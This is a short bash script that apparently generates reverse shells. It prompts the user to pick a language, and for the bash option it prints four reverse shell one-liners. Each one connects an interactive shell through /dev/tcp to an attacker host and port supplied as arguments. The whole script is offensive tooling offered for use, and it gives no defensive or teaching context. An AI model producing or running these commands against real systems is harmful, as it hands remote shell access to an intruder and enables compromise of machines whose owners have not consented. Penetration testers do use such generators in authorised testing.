#!/bin/bash

echo "Select any language to get its shell code"
echo "1.bash"
read choice
if [ "$choice" == "1" ]
then
echo "bash -i >& /dev/tcp/$1/$2 0>&1"
echo "bash -c 'bash -i >& /dev/tcp/$1/$2 0>&1'"
echo "0<&196;exec 196<>/dev/tcp/$1/$2; sh <&196 >&196 2>&196"
echo "/bin/bash -l > /dev/tcp/$1/$2 0<&1 2>&1"
fi
